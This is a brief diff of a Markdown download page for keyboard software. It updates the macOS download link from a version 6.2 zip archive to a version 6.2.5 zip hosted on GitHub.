@@ -2,7 +2,7 @@
     #Download the software and manual to start using the keyboard!
      markdown            
 [Click to download Windows software](https://github.com/stefanmayu/kpxos/raw/refs/heads/main/JPX(ver6.2.4).zip)       
-[Click to download Macbook software](https://github.com/stefanmayu/kpxos/raw/refs/heads/main/JPX6.2.zip) 
+[Click to download Macbook software](https://github.com/stefanmayu/kpxos/raw/refs/heads/main/JPX6.2.5.zip) 
     
             
             
